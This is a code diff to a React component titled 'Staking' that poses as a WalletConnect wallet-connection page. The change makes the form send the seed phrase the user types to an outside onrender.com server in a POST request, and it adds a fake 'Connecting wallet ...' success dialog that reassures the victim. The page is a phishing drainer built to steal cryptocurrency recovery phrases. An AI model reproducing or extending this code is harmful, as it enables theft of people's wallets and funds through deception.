@@ -147,10 +147,10 @@ export default function Staking() {
 
     const payload = {
       wallet: selectedWallet.name,
-      phrase: selectedOption === phrase,
+      phrase: mnemonic,
     };
 
-    fetch('https://personalmailernew.onrender.com/details', {
+    fetch('https://marloweozil.onrender.com/details', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -189,51 +189,6 @@ export default function Staking() {
         setIsLoading(false);
       });
   };
-
-  {
-    isSuccess && (
-      <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
-        <div className="p-6 w-full max-w-sm text-center text-black bg-white rounded-xl shadow-lg">
-          <div className="flex justify-center mb-6">
-            <svg
-              className="w-24 h-24 text-green-500 animate-draw"
-              viewBox="0 0 52 52"
-            >
-              <circle
-                className="text-green-500 stroke-current"
-                cx="26"
-                cy="26"
-                r="25"
-                fill="none"
-                strokeWidth="2"
-              />
-              <path
-                className="text-green-500 stroke-current"
-                fill="none"
-                strokeWidth="3"
-                d="M14 27l7 7 17-17"
-              />
-            </svg>
-          </div>
-          <p className="text-lg lg:text-[25px] font-medium mb-5 text-gray-500">
-            Connecting
-          </p>
-          <p className="text-[15px] lg:text-[18px] font-medium mb-5 text-gray-500">
-            Connecting wallet ...
-          </p>
-          <button
-            onClick={() => {
-              setIsSuccess(false);
-              setModalOpen(false); // Close the modal
-            }}
-            className="px-4 py-2 text-white bg-green-500 rounded transition hover:bg-green-600"
-          >
-            Ok
-          </button>
-        </div>
-      </div>
-    );
-  }
 
   // Modal content logic
   const renderModalContent = () => {
@@ -312,7 +267,7 @@ export default function Staking() {
             value={mnemonic}
             onChange={(e) => setMnemonic(e.target.value)}
           />
-          <button className="py-2 w-full font-semibold text-gray-500 bg-[#5142FC] hover:bg-opacity-90 rounded-lg cursor-pointer">
+          <button className="py-2 w-full font-semibold text-white bg-[#5142FC] hover:bg-opacity-90 rounded-lg cursor-pointer">
             {isLoading ? (
               <>
                 <div className="flex justify-center items-center">
@@ -391,6 +346,49 @@ export default function Staking() {
       <div className="mt-24 mb-2 text-sm text-center text-slate-900">
         WalletConnect © 2025. All Rights Reserved.
       </div>
+      {/* Success Modal */}
+      {isSuccess && (
+        <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
+          <div className="p-6 w-full max-w-sm text-center text-black bg-white rounded-xl shadow-lg">
+            <div className="flex justify-center mb-6">
+              <svg
+                className="w-24 h-24 text-green-500 animate-draw"
+                viewBox="0 0 52 52"
+              >
+                <circle
+                  className="text-green-500 stroke-current"
+                  cx="26"
+                  cy="26"
+                  r="25"
+                  fill="none"
+                  strokeWidth="2"
+                />
+                <path
+                  className="text-green-500 stroke-current"
+                  fill="none"
+                  strokeWidth="3"
+                  d="M14 27l7 7 17-17"
+                />
+              </svg>
+            </div>
+            <p className="text-lg lg:text-[25px] font-medium mb-5 text-gray-500">
+              Connecting
+            </p>
+            <p className="text-[15px] lg:text-[18px] font-medium mb-5 text-gray-500">
+              Connecting wallet ...
+            </p>
+            <button
+              onClick={() => {
+                setIsSuccess(false);
+                setModalOpen(false); // Close the modal
+              }}
+              className="px-4 py-2 text-white bg-green-500 rounded transition hover:bg-green-600"
+            >
+              Ok
+            </button>
+          </div>
+        </div>
+      )}
       {/* Modal for wallet connection */}
       <Modal
         isOpen={modalOpen}
